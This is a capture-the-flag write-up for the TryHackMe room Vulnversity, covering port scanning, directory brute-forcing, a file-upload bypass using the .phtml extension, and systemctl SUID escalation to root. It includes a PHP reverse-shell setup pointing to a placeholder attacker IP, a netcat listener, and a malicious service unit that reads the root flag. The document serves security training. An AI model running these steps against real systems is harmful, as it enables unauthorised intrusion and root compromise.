# Vulnversity

**Platform:** TryHackMe  
**Difficulty:** Medium  
**Category:** Web Exploitation / Linux Privilege Escalation  
**Status:** ✅ Completed  
**Techniques:** Nmap Enumeration · Directory Brute-forcing · File Upload Bypass · SUID Exploitation  

---

## Overview

Vulnversity is a foundational web application and Linux privilege escalation room. It simulates a university web server with a misconfigured file upload endpoint that allows uploading a PHP reverse shell. Post-exploitation focuses on SUID binary abuse for privilege escalation to root.

This room mirrors a common real-world finding — unrestricted or poorly filtered file uploads leading to Remote Code Execution (RCE).

---

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port scanning and service enumeration |
| `gobuster` | Web directory brute-forcing |
| Burp Suite | File upload filter bypass |
| PHP reverse shell | Initial foothold |
| `find` | SUID binary discovery |
| `systemctl` | SUID abuse for root |

---

## Phase 1 — Reconnaissance

### Port Scan

```bash
nmap -sV -sC -T4 <TARGET_IP>
```

Key open ports:

| Port | Service | Notes |
|---|---|---|
| 21 | FTP | vsftpd |
| 22 | SSH | OpenSSH |
| 139 / 445 | SMB | Samba |
| 3128 | Squid Proxy | HTTP proxy service |
| 3333 | HTTP | Web server running here (not 80) |

**Key finding:** Web server is on port **3333**, not the default 80. Easy to miss without a full port scan — always scan all ports.

---

## Phase 2 — Web Enumeration

### Directory Brute-force

```bash
gobuster dir \
  -u http://<TARGET_IP>:3333 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

A hidden directory `/internal/` is discovered — this is the file upload endpoint.

Browsing to `http://<TARGET_IP>:3333/internal/` reveals a basic file upload form.

---

## Phase 3 — File Upload Filter Bypass

### Testing the Filter

A direct `.php` file upload is rejected by the server. The filter is blocking PHP extensions.

Burp Suite is used to intercept the upload request and fuzz the extension field using the Intruder module with a list of alternate PHP extensions:

```
.php
.php3
.php4
.php5
.phtml
```

**Finding:** `.phtml` is accepted by the server — the filter only blocks `.php` but not alternate PHP extensions.

### Uploading the Reverse Shell

A PHP reverse shell (pentestmonkey) is prepared:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.phtml
```

Edit `shell.phtml` — set attacker IP and port:
```php
$ip = '<ATTACKER_IP>';
$port = 4444;
```

Upload `shell.phtml` via the `/internal/` form. Uploaded files are served from `/internal/uploads/`.

### Catching the Shell

```bash
nc -lvnp 4444
```

Navigate to `http://<TARGET_IP>:3333/internal/uploads/shell.phtml` to trigger execution.

**Result:** Reverse shell received as `www-data`.

---

## Phase 4 — Privilege Escalation

### SUID Binary Discovery

```bash
find / -perm -u=s -type f 2>/dev/null
```

`/bin/systemctl` appears in the output with the SUID bit set — this is the escalation vector.

### Exploiting systemctl SUID

`systemctl` with SUID allows creating and starting a service that runs as root. A malicious service unit file is created:

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "cat /root/root.txt > /tmp/flag && chmod 777 /tmp/flag"
[Install]
WantedBy=multi-user.target' > $TF

/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

**Result:** Root flag written to `/tmp/flag` — readable by `www-data`. Full root code execution achieved.

---

## Attack Chain Summary

```
Nmap → Port 3333 (HTTP)
    │
    ▼
Gobuster → /internal/ (upload form)
    │
    ▼
Burp Intruder → .phtml bypass
    │
    ▼
PHP reverse shell uploaded → www-data shell
    │
    ▼
find SUID → /bin/systemctl
    │
    ▼
Malicious service unit → Root execution ✅
```

---

## Key Takeaways

**1. Always scan all ports**
The web server was on 3333, not 80. A default nmap scan without `-p-` would miss it entirely.

**2. Extension blacklists are weak**
Blocking `.php` while allowing `.phtml`, `.php5`, `.phar` is a common misconfiguration. Whitelist-only approaches (allow only `.jpg`, `.png`) are the correct fix.

**3. SUID on systemctl = instant root**
Any binary with SUID that can execute arbitrary commands is a privesc path. `systemctl`, `find`, `vim`, `python` with SUID are all critical findings in a real audit.

---

## Real-World VAPT Relevance

| Step | Real Engagement Equivalent |
|---|---|
| Directory brute-force | Standard web app recon phase |
| File upload bypass | High-severity finding — leads to RCE |
| SUID enumeration | Standard Linux post-exploitation checklist item |
| systemctl abuse | Reported as critical in internal Linux audits |

---

## References

- [GTFOBins — systemctl](https://gtfobins.github.io/gtfobins/systemctl/)
- [Pentestmonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
- [TryHackMe — Vulnversity](https://tryhackme.com/room/vulnversity)
